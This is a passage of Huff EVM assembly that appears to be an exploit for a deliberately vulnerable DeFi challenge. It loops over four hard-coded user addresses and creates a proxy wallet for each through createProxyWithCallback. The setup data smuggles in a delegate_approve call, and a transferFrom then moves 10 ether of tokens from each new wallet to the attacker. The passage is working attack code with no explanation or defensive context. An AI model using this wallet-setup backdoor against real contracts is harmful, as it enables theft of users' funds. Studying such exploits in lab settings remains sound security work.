    // [OFFSET 0x280]  0000000000000000000000000000000000000000000000000000000000000000 -> 32 bytes of padding
    // [OFFSET 0x2a0]  0000000000000000000000000000000000000000000000000000000023b872dd -> `transferFrom(address,address,uint256)` func sig
    // [OFFSET*0x2c0]  0000000000000000000000000000000000000000000000000000000000000000 -> ***return data from `createProxyWithCallback` (address) ***
    // [OFFSET 0x2e0]  000000000000000000000000c89D42189f0450C2b2c3c61f58Ec5d628176A1E7 -> msg.sender
    // [OFFSET 0x300]  0000000000000000000000000000000000000000000000008AC7230489E80000 -> amount (uint256) this will be hardcoded to 0x8AC7230489E80000 (10 ether)
    // [OFFSET 0x320]  000000000000000000000000318b469BBa396AEc2C60342F9441be36A1945174 -> first user in array
    // [OFFSET 0x340]  0000000000000000000000001e14cBD146c3a5496F588CF28Ee656c210057904 -> second user in array
    // [OFFSET 0x360]  00000000000000000000000063953eB1B3D8DB28334E7C1C69456C851F934199 -> third user in array
    // [OFFSET 0x380]  0000000000000000000000001e6f0dfb1775f5032f12f56a01526351eD3F07aF -> fourth user in array

        // CALL into factory
        0x20          // [0x20, offset, index, factory, token] - size of return data (address)
        0x2c0         // [0x2c0, 0x20, offset, index, factory, token] - byte offset in mem where return data is copied
        0x284         // [0x284, 0x2c0, 0x20, offset, index, factory, token] - size of calldata (length is 644 bytes)
        0x1c          // [0x1c, 0x284, 0x2c0, 0x20, offset, index, factory, token] - byte offset in mem where calldata starts
        0x00          // [0x00, 0x1c, 0x284, 0x2c0, 0x20, offset, index, factory, token] - msg.value to send with call
        dup8          // [factory, 0x00, 0x1c, 0x284, 0x2c0, 0x20, offset, index, factory, token] - calling nft
        gas           // [gas, factory, 0x00, 0x1c, 0x284, 0x2c0, 0x20, offset, index, factory, token] - gas to send with call
        call          // [success, offset, index, factory, token]
        iszero        // [0/1, offset, index, factory, token]
        throw_error   // [throw_error, 0/1, offset, index, factory, token]
        jumpi         // [offset, index, factory, token]


        // CALL into token
        0x00          // [0x00, offset, index, factory, token] - size of return data
        dup1          // [0x00, 0x00, offset, index, factory, token] - byte offset in mem where return data is copied
        0x64          // [0x64, 0x00, 0x00, offset, index, factory, token] - size of calldata
        0x2bc         // [0x2bc, 0x64, 0x00, 0x00, offset, index, factory, token] - byte offset in mem where calldata starts
        dup3          // [0x00, 0x2bc, 0x64, 0x00, 0x00, offset, index, factory, token] - msg.value to send with call
        dup9          // [token, 0x00, 0x2bc, 0x64, 0x00, 0x00, offset, index, factory, token] - calling nft
        gas           // [gas, token, 0x00, 0x2bc, 0x64, 0x00, 0x00, offset, index, factory, token] - gas to send with call
        call          // [success, offset, index, factory, token]
        iszero        // [0/1, offset, index, factory, token]
        throw_error   // [throw_error, 0/1, offset, index, factory, token]
        jumpi         // [offset, index, factory, token]

        // Increment index
        swap1         // [index, offset, factory, token]
        0x01          // [0x01, index, offset, factory, token]
        add           // [new_index, offset, factory, token] - increment index by one
        swap1         // [offset, new_index, factory, token]
        dup2          // [new_index, offset, new_index, factory, token]
        0x04          // [0x04, new_index, offset, new_index, factory, token] - array length
        gt            // [0/1, offset, new_index, factory, token] - compare new_index with length of array
        loop          // [loop, 0/1, offset, new_index, factory, token]
        jumpi         // [offset, new_index, factory, token] - continue loop if we did not go through each item in the array. If we did, continue execution below

    // Bytes data within `createProxyWithCallback`: setup(address[],uint256,address,bytes,address,address,uint256,address) - this data is 0x1c4 (452) bytes
    // Bytes data within `setup`: delegate_approve(address,address) - this data is 0x44 (68) bytes

    stop

    throw_error:
        0x00 0x00 revert
}

#define macro MAIN() = takes (0) returns (0) {}
